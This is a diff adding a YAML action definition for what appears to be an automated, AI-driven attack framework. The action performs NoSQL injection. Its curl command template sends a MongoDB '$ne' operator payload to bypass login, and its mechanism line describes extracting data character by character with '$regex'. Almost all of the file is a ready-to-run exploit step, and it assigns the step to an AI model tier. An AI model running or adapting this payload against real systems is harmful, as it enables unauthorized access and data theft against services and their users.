@@ -1,0 +1,16 @@
+name: nosqli
+category: web
+description: NoSQL injection exploitation
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s '{target_url}' -H 'Content-Type: application/json' -d '{{"username":{{"$ne":""}},"password":{{"$ne":""}}}}'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "MongoDB: {"$ne":""} bypasses auth, {"$regex":"^a"} extracts data char by char. Common in Node.js/Express apps with MongoDB."
